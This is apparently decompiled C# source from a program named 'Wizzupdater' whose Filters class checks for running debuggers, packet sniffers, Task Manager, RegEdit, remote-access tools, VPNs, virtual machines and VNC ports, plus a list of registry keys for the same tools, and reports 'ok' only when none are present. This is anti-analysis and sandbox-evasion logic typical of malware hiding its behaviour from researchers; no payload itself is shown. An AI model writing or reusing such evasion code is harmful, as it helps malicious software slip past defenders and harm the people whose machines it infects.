﻿using System;
using System.Collections.Generic;

namespace Wizzupdater.Services
{
	// Token: 0x02000017 RID: 23
	internal class Filters
	{
		// Token: 0x06000078 RID: 120 RVA: 0x000036C4 File Offset: 0x000018C4
		public static bool isOk()
		{
			return !RegSystem.IsOneExist(new List<string>(Filters.regFilters)) && !System.IsProssRunning("HMA! Pro VPN") && !System.IsProssRunning("TeamViewer") && !System.IsProssRunning("TeamViewer_Desktop") && !System.IsProssRunning("TeamViewer_Service") && !System.IsProssRunning("DFServ") && !System.IsProssRunning("Fiddler") && !System.IsProssRunning("Wireshark") && !System.IsProssRunning("Capsa") && !System.IsProssRunning("ipscan") && !System.IsProssRunning("Procmon") && !System.IsProssRunning("OLLYDBG") && !System.IsProssRunning("Regshot-x64-Unicode.exe") && !System.IsProssRunning("Regshot-Unicode.exe") && !System.IsTaskMgrRunning() && !System.IsRegEditRunning() && !System.IsRunningVM() && !System.IsPortInUse(5900) && !System.IsPortInUse(5901) && !System.IsPortInUse(5902) && !System.IsPortInUse(5903) && !System.IsPortInUse(5904);
		}

		// Token: 0x04000038 RID: 56
		private static string[] regFilters = new string[]
		{
			"SOFTWARE\\Wow6432Node\\TeamViewer",
			"SOFTWARE\\TeamViewer",
			"SOFTWARE\\Wow6432Node\\TunnelBear\\",
			"SOFTWARE\\TunnelBear\\",
			"SOFTWARE\\Wow6432Node\\TunnelBear\\",
			"SOFTWARE\\TunnelBear\\",
			"SOFTWARE\\Wow6432Node\\Golden Frog",
			"GmbH.\\VyprVPN\\,SOFTWARE\\Golden Frog",
			"GmbH.\\VyprVPN\\",
			"SOFTWARE\\Wow6432Node\\Golden Frog",
			"GmbH.\\VyprVPN\\,SOFTWARE\\Golden Frog",
			"GmbH.\\VyprVPN\\",
			"SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\Wiresharsk",
			"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\Wiresharsk",
			"SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\Wiresharsk",
			"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\Wiresharsk",
			"Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\HMA! Pro VPN",
			"Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\HMA! Pro VPN",
			"Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\ExpressVPN",
			"Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\ExpressVPN",
			"Software\\Wow6432Node\\ExpressVPN",
			"Software\\ExpressVPN",
			"Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\PureVPN_is1",
			"Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\PureVPN_is1",
			"Software\\Wow6432Node\\Classes\\Installer\\Products\\FFAD27D72BCDB734CB22B4A2FB1264B2",
			"Software\\Classes\\Installer\\Products\\FFAD27D72BCDB734CB22B4A2FB1264B2",
			"Software\\Privax",
			"Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\006adc251e9a903c",
			"Software\\CyberGhost",
			"Software\\Golden Frog, GmbH.\\VyprVPN",
			"Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\80030f8e66f1b450",
			"SOFTWARE\\Classes\\Virtual.Machine.VMC",
			"SOFTWARE\\Wow6432Node\\Classes\\Virtual.Machine.VMC",
			"Software\\Oracle\\VirtualBox",
			"Software\\VMware, Inc.",
			"Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\Fiddler2",
			"Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\Fiddler2",
			"Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\Wireshark",
			"Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\Wireshark",
			"Software\\Wow6432Node\\Wireshark",
			"Software\\Wireshark",
			"Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\Colasoft Capsa 7 Professional Demo_is1",
			"Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\Colasoft Capsa 7 Professional Demo_is1",
			"Software\\Wow6432Node\\Colasoft\\Capsa",
			"Software\\Colasoft\\Capsa",
			"Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Angry IP Scanner",
			"Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\Angry IP Scanner",
			"Software\\Wow6432Node\\Angry IP Scanner",
			"Software\\Angry IP Scanner"
		};
	}
}
